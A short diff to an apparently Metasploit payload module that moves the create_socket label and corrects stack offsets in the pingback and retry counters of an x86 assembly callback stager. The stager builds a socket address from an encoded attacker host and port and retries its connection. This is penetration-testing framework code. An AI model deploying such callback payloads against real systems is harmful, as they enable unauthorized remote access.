@@ -159,12 +159,11 @@ module MetasploitModule
         set_address:
           push #{pingback_count}     ; retry counter
           push #{retry_count}     ; retry counter
-
-        create_socket:
           push #{encoded_host}    ; host in little-endian format
           push #{encoded_port}    ; family AF_INET and port number
           mov esi, esp            ; save pointer to sockaddr struct
 
+        create_socket:
           push eax                ; if we succeed, eax will be zero, push zero for the flags param.
           push eax                ; push null for reserved parameter
           push eax                ; we do not specify a WSAPROTOCOL_INFO structure
@@ -217,10 +216,10 @@ module MetasploitModule
         ^
         if pingback_count > 0
           asm << %Q^
-            mov eax, [esp]
+            mov eax, [esi+12]
             test eax, eax               ; pingback counter
             jz exitfunk
-            dec [esp+4]
+            dec [esi+12]
             sleep:
               push #{(pingback_sleep*1000).to_s}
               push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
@@ -232,7 +231,7 @@ module MetasploitModule
           ; restore the stack back to the connection retry count
           pop esi
           pop esi
-          dec [esp]               ; decrement the retry counter
+          dec [esi+8]               ; decrement the retry counter
           jmp exitfunk
 
           ; try again
